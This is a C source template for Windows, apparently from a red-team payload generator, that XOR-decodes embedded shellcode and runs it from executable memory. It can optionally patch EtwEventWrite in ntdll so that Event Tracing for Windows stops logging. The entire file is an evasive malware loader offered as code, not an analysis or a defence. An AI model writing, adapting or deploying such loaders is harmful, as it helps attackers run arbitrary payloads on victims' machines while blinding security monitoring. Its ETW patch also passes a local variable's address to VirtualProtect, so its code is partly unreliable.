#include <windows.h>

BYTE* XOR(BYTE* buf, size_t sz)
{
	char key = {{ XOR_KEY }};

	for (int i = 0; i < (int)sz; i++)
		buf[i] = buf[i] ^ key;
	
	return buf;
}

{% if PATCH_ETW %}
void PatchETW()
{
	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

	char etwPatch[] = { 0xC3 };

	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;

	VirtualProtect((LPVOID)&etwAddr_bk, (SIZE_T)&memPage, 0x04, &lpflOldProtect);
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)NULL);
	VirtualProtect((LPVOID)&etwAddr_bk, (SIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
}
{% endif %}

void Inject()
{
	unsigned char shellcode[] = { {{ "shellcode.bin" | content | xor | hexarr }} };

	XOR(shellcode, sizeof(shellcode));

	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof(shellcode));
	((void(*)())exec)();
}

void Go()
{
	{% if PATCH_ETW%}
	PatchETW();
	{% endif %}

	Inject();
}


int main(int argc, char* argv)
{
	Go();

	while(TRUE){}
}